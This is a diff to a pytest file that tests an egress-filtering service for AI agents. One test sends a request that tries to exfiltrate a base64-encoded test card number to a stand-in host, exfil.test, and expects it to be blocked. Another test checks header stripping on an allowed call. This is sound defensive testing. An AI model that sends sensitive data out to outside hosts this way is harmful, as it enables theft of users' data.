@@ -9,6 +9,7 @@ import httpx
 import pytest
 
 from aegis.api.routes import egress as route
+from aegis.sdk.cast import agent_headers  # ASI03: X-Aegis-Agent + its key
 
 pytestmark = pytest.mark.slow
 
@@ -38,7 +39,7 @@ async def stack(tmp_path, monkeypatch):
 async def test_exfil_blocked_real_stack(stack) -> None:
     c, seen = stack
     pan = base64.b64encode(b"4111 1111 1111 1111").decode()
-    r = await c.post("/egress", headers={"x-aegis-agent": "chaos-agent@platform"},
+    r = await c.post("/egress", headers=agent_headers("chaos-agent@platform"),
                      json={"method": "GET", "url": f"https://exfil.test/c?d={pan}"})
     assert r.status_code in (403, 429), r.text
     if r.status_code == 403:
@@ -49,7 +50,7 @@ async def test_exfil_blocked_real_stack(stack) -> None:
 
 async def test_allowed_crm_headers_stripped_real_stack(stack) -> None:
     c, seen = stack
-    r = await c.post("/egress", headers={"x-aegis-agent": "research-agent@research"},
+    r = await c.post("/egress", headers=agent_headers("research-agent@research"),
                      json={"method": "GET", "url": "https://crm.saas.test/crm/contacts",
                            "headers": {"X-Forwarded-For": "10.1.2.3", "Cookie": "s=1",
                                        "x-stainless-os": "MacOS"}})
